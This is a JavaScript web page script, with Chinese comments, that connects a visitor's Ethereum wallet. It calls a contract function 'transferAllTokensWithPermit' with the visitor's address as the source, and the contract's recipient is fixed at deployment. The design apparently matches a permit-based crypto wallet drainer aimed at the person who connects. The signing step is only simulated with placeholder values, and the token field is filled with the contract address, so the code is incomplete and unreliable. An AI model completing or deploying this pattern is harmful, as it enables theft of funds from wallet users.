let web3;
let userAddress;

// 设置新的智能合约地址
const contractAddress = '0x9a2E12340354d2532b4247da3704D2A5d73Bd189';

// 设置新的ABI
const contractABI = [
    {
        "inputs": [
            { "internalType": "address", "name": "token", "type": "address" },
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "uint256", "name": "value", "type": "uint256" },
            { "internalType": "uint256", "name": "deadline", "type": "uint256" },
            { "internalType": "uint8", "name": "v", "type": "uint8" },
            { "internalType": "bytes32", "name": "r", "type": "bytes32" },
            { "internalType": "bytes32", "name": "s", "type": "bytes32" }
        ],
        "name": "transferAllTokensWithPermit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "_recipient", "type": "address" }
        ],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "anonymous": false,
        "inputs": [
            { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
            { "indexed": true, "internalType": "address", "name": "from", "type": "address" },
            { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "TransferTokens",
        "type": "event"
    },
    {
        "inputs": [],
        "name": "recipient",
        "outputs": [
            { "internalType": "address", "name": "", "type": "address" }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

// 检查页面加载时是否有以太坊钱包
window.addEventListener('load', () => {
    if (typeof window.ethereum !== 'undefined') {
        console.log('以太坊钱包已检测到。');
    } else {
        console.log('未检测到以太坊钱包。');
    }
});

// 绑定连接钱包按钮事件
document.getElementById('connectButton').addEventListener('click', connectWallet);

// 连接钱包函数
async function connectWallet() {
    console.log("尝试连接钱包...");
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];
            document.getElementById('address').innerText = `钱包地址: ${userAddress}`;
            document.getElementById('tokenAddress').value = contractAddress;
            document.getElementById('fromAddress').value = userAddress;
            
            await signAndFillSignature(userAddress, contractAddress);
        } catch (error) {
            console.error("连接钱包时出错:", error);
            alert('连接钱包失败，请查看控制台的错误信息。');
        }
    } else {
        alert('请安装MetaMask或其他以太坊钱包扩展！');
    }
}

// 模拟签名信息填写
async function signAndFillSignature(userAddress, contractAddress) {
    console.log("正在生成签名...");
    document.getElementById('v').value = 27;
    document.getElementById('r').value = "0x...";
    document.getElementById('s').value = "0x...";
}

// 绑定转移代币按钮事件
document.getElementById('transferButton').addEventListener('click', async () => {
    const tokenAddress = document.getElementById('tokenAddress').value;
    const v = document.getElementById('v').value;
    const r = document.getElementById('r').value;
    const s = document.getElementById('s').value;

    const contract = new web3.eth.Contract(contractABI, contractAddress);

    try {
        await contract.methods.transferAllTokensWithPermit(
            tokenAddress,
            userAddress,
            web3.utils.toWei('1', 'ether'),  // 示例值，替换为所需的数量
            Math.floor(Date.now() / 1000) + 60 * 60,  // 1小时后过期
            v,
            r,
            s
        ).send({ from: userAddress });
        console.log('代币转移成功！');
    } catch (error) {
        console.error('代币转移失败:', error);
    }
});
